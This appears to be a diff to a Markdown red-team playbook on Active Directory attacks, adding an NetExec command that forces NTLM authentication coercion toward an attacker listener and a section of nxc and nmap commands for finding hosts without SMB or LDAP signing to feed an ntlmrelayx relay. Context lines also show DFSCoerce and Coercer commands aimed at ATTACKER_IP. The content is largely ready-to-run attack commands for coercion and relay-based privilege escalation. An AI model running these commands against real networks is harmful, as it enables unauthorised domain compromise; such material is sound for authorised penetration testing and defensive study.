@@ -93,6 +93,8 @@ python3 dfscoerce.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_D
 
 **Note — unified framework:** [p0dalirius/Coercer](https://github.com/p0dalirius/Coercer) automates ~12 coercion methods (including PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce variants) behind one CLI: `python3 Coercer.py coerce -u lowpriv -p 'Password123!' -d DOMAIN -l ATTACKER_IP -t TARGET_IP`.
 
+**Faster (nxc):** `nxc smb <target> -u lowpriv -p Password123! -d DOMAIN -M coerce_plus -o LISTENER=<attacker_ip>` checks all major coercion methods (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce/MSEven) against a target in one command.
+
 ---
 
 ## NTLM Relay Chains via impacket `ntlmrelayx`
@@ -100,6 +102,22 @@ python3 dfscoerce.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_D
 **What/why:** `ntlmrelayx.py` (part of [fortra/impacket](https://github.com/fortra/impacket)) listens for incoming NTLM authentication (from a coercion primitive above, or from LLMNR/NBT-NS/mDNS poisoning via `Responder`, or IPv6 DNS takeover via `mitm6`) and **relays** it — without cracking the hash — to a *different* target/protocol that does not enforce SMB/LDAP signing or channel binding, performing an action as the victim identity. This is the step that turns a coercion primitive into privilege escalation.
 
 **Prerequisites (general):** target service does not enforce signing (SMB signing off) or, for LDAP/LDAPS, does not enforce LDAP signing / channel binding (CBT); the relay session must be single-use per authentication (SMB `refreshttl`, `-socks` for reuse); the coerced/poisoned identity must have meaningful privileges on the relay target (a DC machine account is the prime target since it has broad AD write rights and often domain-admin-equivalent enrollment rights on ADCS).
+
+### Target discovery — finding relay-eligible hosts (signing disabled)
+
+**What/why:** Before picking a relay target, enumerate which hosts on the subnet have SMB signing disabled (relayable) and which DC(s) allow LDAP without signing/channel binding. This is also how the `TARGETS.txt` file used in section (d) below is built.
+
+```bash
+# SMB signing status across a subnet — writes only signing-disabled hosts to a targets file
+nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
+
+# Equivalent with nmap
+nmap --script smb2-security-mode -p445 10.10.10.0/24
+
+# LDAP signing/channel-binding status on DCs (relay-to-LDAP eligibility)
+nxc ldap 10.10.10.0/24 -u lowpriv -p 'Password123!' -d DOMAIN -M ldap-checker
+```
+`relay_targets.txt` (or the nmap-derived host list) is then passed to `ntlmrelayx.py -tf TARGETS.txt` / `-t` as shown in section (d).
 
 ### a) Relay to LDAP for RBCD (Resource-Based Constrained Delegation)
 
